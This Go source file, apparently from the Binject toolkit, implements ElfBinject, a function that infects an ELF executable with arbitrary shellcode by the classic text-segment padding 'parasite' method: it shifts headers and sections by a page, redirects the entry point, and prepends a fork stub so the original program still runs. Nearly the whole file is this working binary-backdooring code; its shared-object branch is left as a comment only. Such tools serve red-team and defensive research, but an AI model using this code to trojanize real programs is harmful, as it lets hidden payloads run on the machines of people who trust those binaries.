package bj

import (
	"errors"
	"io/ioutil"
	"log"
	"sort"

	"github.com/Binject/debug/elf"
	"github.com/Binject/shellcode/api"
)

// ElfBinject - Inject shellcode into an ELF binary
func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {

	userShellCode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}

	elfFile, err := elf.Open(sourceFile)
	if err != nil {
		return err
	}

	//
	// BEGIN CODE CAVE DETECTION SECTION
	//

	if config.CodeCaveMode == true {
		log.Printf("Using Code Cave Method")
		caves, err := FindCaves(sourceFile)
		if err != nil {
			return err
		}
		for _, cave := range caves {
			for _, section := range elfFile.Sections {
				if cave.Start >= section.Offset && cave.End <= (section.Size+section.Offset) &&
					cave.End-cave.Start >= uint64(MIN_CAVE_SIZE) {
					log.Printf("Cave found (start/end/size): %d / %d / %d \n", cave.Start, cave.End, cave.End-cave.Start)
				}
			}
		}
	}
	//
	// END CODE CAVE DETECTION SECTION
	//

	/*
			  Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
		        6. Increase p_shoff by PAGE_SIZE in the ELF header
		        7. Patch the insertion code (parasite) to jump to the entry point (original)
		        1. Locate the text segment program header
		            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
		            -Increase p_filesz to account for the new code (parasite)
		            -Increase p_memsz to account for the new code (parasite)
		        2. For each phdr which is after the insertion (text segment)
		            -increase p_offset by PAGE_SIZE
		        3. For the last shdr in the text segment
		            -increase sh_len by the parasite length
		        4. For each shdr which is after the insertion
		            -Increase sh_offset by PAGE_SIZE
		        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
					into the file - text segment p_offset + p_filesz (original)
	*/

	PAGE_SIZE := uint64(4096)
	scAddr := uint64(0)
	sclen := uint64(0)
	shellcode := []byte{}

	// 6. Increase p_shoff by PAGE_SIZE in the ELF header
	elfFile.FileHeader.SHTOffset += int64(PAGE_SIZE)

	afterTextSegment := false
	for _, p := range elfFile.Progs {

		if afterTextSegment {
			//2. For each phdr which is after the insertion (text segment)
			//-increase p_offset by PAGE_SIZE
			p.Off += PAGE_SIZE
		} else if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
			// 1. Locate the text segment program header
			// -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
			originalEntry := elfFile.FileHeader.Entry

			switch elfFile.FileHeader.Type {
			case elf.ET_EXEC:
				elfFile.FileHeader.Entry = p.Vaddr + p.Filesz
			case elf.ET_DYN:
				// The injected code needs to be executed before any init code in the
				// binary. There are three possible cases:
				// - The binary has no init code at all. In this case, we will add a
				//   DT_INIT entry pointing to the injected code.
				// - The binary has a DT_INIT entry. In this case, we will interpose:
				//   we change DT_INIT to point to the injected code, and have the
				//   injected code call the original DT_INIT entry point.
				// - The binary has no DT_INIT entry, but has a DT_INIT_ARRAY. In this
				//   case, we interpose as well, by replacing the first entry in the
				//   array to point to the injected code, and have the injected code
				//   call the original first entry.
				// The binary may have .ctors instead of DT_INIT_ARRAY, for its init
				// functions, but this falls into the second case above, since .ctors
				// are actually run by DT_INIT code.
				// from positron/elfhack

			default:
				return errors.New("Unknown Executable Type: " + string(elfFile.FileHeader.Type))
			}

			// 7. Patch the insertion code (parasite) to jump to the entry point (original)
			shellcode = api.ApplyPrefixForkIntel64(userShellCode, uint32(originalEntry), elfFile.ByteOrder)
			sclen = uint64(len(shellcode))

			log.Println("Shellcode Length: ", sclen)

			// -Increase p_filesz to account for the new code (parasite)
			p.Filesz += sclen
			// -Increase p_memsz to account for the new code (parasite)
			p.Memsz += sclen

			scAddr = p.Off + p.Filesz
			afterTextSegment = true
		}
	}

	//	3. For the last shdr in the text segment
	sortedSections := elfFile.Sections[:]
	sort.Slice(sortedSections, func(a, b int) bool { return elfFile.Sections[a].Offset < elfFile.Sections[b].Offset })
	for _, s := range sortedSections {

		if s.Addr > scAddr {
			// 4. For each shdr which is after the insertion
			//	-Increase sh_offset by PAGE_SIZE
			s.Offset += PAGE_SIZE

		} else if s.Size+s.Addr == scAddr { // assuming entry was set to (p_vaddr + p_filesz) above
			//	-increase sh_len by the parasite length
			s.Size += sclen
		}
	}

	// 5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
	//	into the file - text segment p_offset + p_filesz (original)
	elfFile.Insertion = shellcode

	return elfFile.Write(destFile)
}
